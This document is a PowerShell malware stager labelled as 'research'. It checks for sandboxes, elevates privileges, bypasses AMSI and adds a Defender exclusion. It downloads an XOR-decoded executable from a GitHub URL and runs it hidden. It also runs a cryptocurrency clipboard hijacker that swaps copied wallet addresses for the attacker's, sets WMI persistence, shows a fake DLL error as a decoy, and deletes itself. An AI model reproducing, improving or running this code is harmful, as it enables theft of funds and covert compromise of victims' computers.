# --- [RESEARCH STAGER v89.0: MASTER ENTERPRISE] ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. GATEKEEPER & ADMIN GATE (LOCKED LOGIC)
if ($((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB) -lt 4) { exit } 

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

# 2. AMSI BYPASS & ADDRESS FRAGMENTATION
function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch { }
}

# Fragmented Wallet Logic
$b1 = "12nL9SBgp"; $b2 = "SmSdSybq2b"; $b3 = "W2vKdoTggTnXVNA"
$e1 = "0x6c9ba9a6"; $e2 = "522b10135b"; $e3 = "b836fc9340477ba15f3392"
$s1 = "BnBvKVEFR"; $s2 = "cxokGZv9sA"; $s3 = "wig8eQ4GvQY1frmZJWzU1bBNR"
$t1 = "TVETSgvRu"; $t2 = "i2LCmXyuvh"; $t3 = "8jHG6AjpxquFbnp"

$ClipperLogic = {
    $w = @{
        'btc'  = "$($using:b1)$($using:b2)$($using:b3)";
        'eth'  = "$($using:e1)$($using:e2)$($using:e3)";
        'sol'  = "$($using:s1)$($using:s2)$($using:s3)";
        'usdt' = "$($using:t1)$($using:t2)$($using:t3)"
    }
    Add-Type -As System.Windows.Forms
    while($true) {
        try {
            if([Windows.Forms.Clipboard]::ContainsText()){
                $v = [Windows.Forms.Clipboard]::GetText().Trim()
                if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } }
                elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } }
                elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } }
                elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } }
            }
        } catch{}
        Start-Sleep -m 500
    }
}

# 3. PERMANENT WMI WATCHDOG (Hex Encoded)
function Set-MasterWatchdog {
    $C = [System.Text.Encoding]::Unicode.GetBytes($using:ClipperLogic)
    $B64 = [Convert]::ToBase64String($C)
    $Q = "SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe'"
    $Cmd = "powershell.exe -NoP -W Hidden -EP Bypass -Enc $B64"
    $NS = "root\subscription"
    
    # Cleanup and Bind
    Get-WmiObject -Namespace $NS -Class __EventFilter -Filter "Name='MevFilter'" | Remove-WmiObject -EA SilentlyContinue
    $F = Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{Name='MevFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$Q}
    $C = Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{Name='MevConsumer'; CommandLineTemplate=$Cmd}
    Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=$F; Consumer=$C} | Out-Null
}

# 4. DEPLOYMENT CORE (v65.0 Logic)
try {
    # Initialize Security Bypass
    Global-Initialize
    
    # Setup Directory & XOR Engine
    $dir = "$env:PROGRAMDATA\Microsoft\Windows\Sync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
    
    $path = Join-Path $dir "WinSvcHost.exe"
    $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)
    
    # Launch Payload & Persistence
    Start-Process $path -WindowStyle Hidden
    Start-Job -ScriptBlock $ClipperLogic -Name "MevSync" | Out-Null
    Set-MasterWatchdog

    # 5. FAKE DLL ERROR (Decoy)
    $msg = "The program can't start because msvcr120_clr0400.dll is missing from your computer. Try reinstalling the program to fix this problem."
    [Windows.Forms.MessageBox]::Show($msg, "System Error", 0, 16) | Out-Null

    # Self-Destruct
    Remove-Item $PSCommandPath -Force -EA SilentlyContinue
} catch { exit }
